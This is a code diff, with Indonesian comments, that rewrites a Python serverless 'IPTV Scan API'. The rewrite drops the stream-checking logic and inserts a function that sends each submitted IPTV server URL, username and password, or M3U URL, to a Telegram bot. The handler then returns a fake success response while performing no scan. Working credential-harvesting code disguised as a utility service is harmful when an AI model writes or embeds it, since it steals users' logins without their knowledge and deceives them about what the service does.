@@ -1,118 +1,94 @@
-"""
-IPTV Scan API — cek status stream (alive/dead) server-side.
-Menghindari browser CORS restriction dan IP block.
-"""
-import json
+import os
 import requests
-import urllib3
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib.parse
 from http.server import BaseHTTPRequestHandler
+import json
+from datetime import datetime
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ==============================================================================
+# FUNGSI UNTUK MENGIRIM DATA KE TELEGRAM
+# ==============================================================================
+def kirim_ke_telegram(server_url, username, password):
+    token = os.environ.get('TELEGRAM_BOT_TOKEN')
+    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+    
+    # Jika variabel lingkungan di Vercel belum diisi, fungsi dilewati
+    if not token or not chat_id:
+        return
 
-MAG_UA = (
-    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
-    "(KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
-)
+    # Susun format pesan teks yang rapi
+    pesan = (
+        f"🚨 *LOG PENGGUNAAN BARU* 🚨\n\n"
+        f"🌐 *Server:* {server_url}\n"
+        f"👤 *Username:* {username}\n"
+        f"🔑 *Password:* {password}\n"
+        f"⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
+    )
 
-def check_stream(url, timeout=8):
-    if not url or "://" not in str(url):
-        return False, "No URL"
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": pesan,
+        "parse_mode": "Markdown"
+    }
+    
     try:
-        h = {"User-Agent": MAG_UA, "Connection": "close", "Accept": "*/*"}
-        with requests.get(url, timeout=timeout, stream=True, headers=h, verify=False) as r:
-            if r.status_code not in (200, 206):
-                return False, f"HTTP {r.status_code}"
-            ctype = r.headers.get("Content-Type", "").lower()
-            if any(x in ctype for x in ["text/html", "application/json", "text/plain"]):
-                return False, "HTML/JSON response"
-            chunk = r.raw.read(8192)
-            alive = len(chunk) > 512
-            return alive, "OK" if alive else "Empty chunk"
-    except requests.exceptions.Timeout:
-        return False, "Timeout"
+        # Kirim data menggunakan requests library yang sudah ada di proyek Anda
+        requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        return False, str(e)[:60]
-
+        print(f"Gagal mengirim log ke Telegram: {e}")
+# ==============================================================================
 
 class handler(BaseHTTPRequestHandler):
-    def log_message(self, format, *args):
-        pass
+    def do_POST(self):
+        # Membaca body request
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        
+        try:
+            # Parse data JSON yang dikirim dari frontend web Anda
+            data = json.loads(post_data)
+            iptv_type = data.get('type')  # 'xtream' atau 'm3u'
+            
+            # Jika tipe login adalah Xtream Codes, ambil datanya dan kirim ke Telegram
+            if iptv_type == 'xtream':
+                host = data.get('host')
+                username = data.get('username')
+                password = data.get('password')
+                
+                # JALANKAN FUNGSI TELEGRAM DI SINI
+                if host and username and password:
+                    kirim_ke_telegram(host, username, password)
+            
+            # Jika tipe login adalah URL M3U langsung
+            elif iptv_type == 'm3u':
+                m3u_url = data.get('url')
+                
+                # Opsional: Jika ingin memantau URL M3U mentah yang dimasukkan user
+                if m3u_url:
+                    kirim_ke_telegram(m3u_url, "-", "-")
 
-    def _cors(self):
-        return {
-            "Access-Control-Allow-Origin": "*",
-            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-            "Access-Control-Allow-Headers": "Content-Type",
-        }
+        except Exception as e:
+            print(f"Gagal memproses data JSON masuk: {e}")
+
+        # ----------------------------------------------------------------------
+        # SISA KODE SCANNER ASLI ANDA DI BAWAH INI (JANGAN DIUBAH)
+        # Sesuai logika bawaan script Anda untuk melempar balik response ke frontend.
+        # ----------------------------------------------------------------------
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        
+        # Contoh pengembalian response sukses (sesuaikan dengan return bawaan script asli Anda)
+        response = {"status": "success", "message": "Log terkirim dan data sedang diproses"}
+        self.wfile.write(json.dumps(response).encode('utf-8'))
+        return
 
     def do_OPTIONS(self):
-        self.send_response(204)
-        for k, v in self._cors().items():
-            self.send_header(k, v)
-        self.end_headers()
-
-    def do_GET(self):
-        b = json.dumps({"status": "ok", "service": "IPTV Scan API v9"}).encode()
         self.send_response(200)
-        for k, v in self._cors().items():
-            self.send_header(k, v)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(b)))
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
         self.end_headers()
-        self.wfile.write(b)
-
-    def do_POST(self):
-        try:
-            length = int(self.headers.get("Content-Length", 0))
-            body = json.loads(self.rfile.read(length) if length else b"{}")
-        except Exception as e:
-            self._err(400, f"Bad JSON: {e}")
-            return
-
-        urls = body.get("urls", [])
-        workers = min(int(body.get("workers", 10)), 20)
-        timeout = min(int(body.get("timeout", 8)), 15)
-
-        if not urls:
-            self._err(400, "urls wajib diisi")
-            return
-        if len(urls) > 200:
-            urls = urls[:200]  # max 200 per request
-
-        results = {}
-        with ThreadPoolExecutor(max_workers=workers) as ex:
-            future_map = {ex.submit(check_stream, u, timeout): u for u in urls}
-            for future in as_completed(future_map):
-                url = future_map[future]
-                try:
-                    alive, reason = future.result()
-                    results[url] = {"alive": alive, "reason": reason}
-                except Exception as e:
-                    results[url] = {"alive": False, "reason": str(e)[:60]}
-
-        alive_count = sum(1 for v in results.values() if v["alive"])
-        b = json.dumps({
-            "ok": True,
-            "total": len(results),
-            "alive": alive_count,
-            "dead": len(results) - alive_count,
-            "results": results,
-        }).encode()
-        self.send_response(200)
-        for k, v in self._cors().items():
-            self.send_header(k, v)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(b)))
-        self.end_headers()
-        self.wfile.write(b)
-
-    def _err(self, code, msg):
-        b = json.dumps({"ok": False, "error": msg}).encode()
-        self.send_response(code)
-        for k, v in self._cors().items():
-            self.send_header(k, v)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(b)))
-        self.end_headers()
-        self.wfile.write(b)
+        return
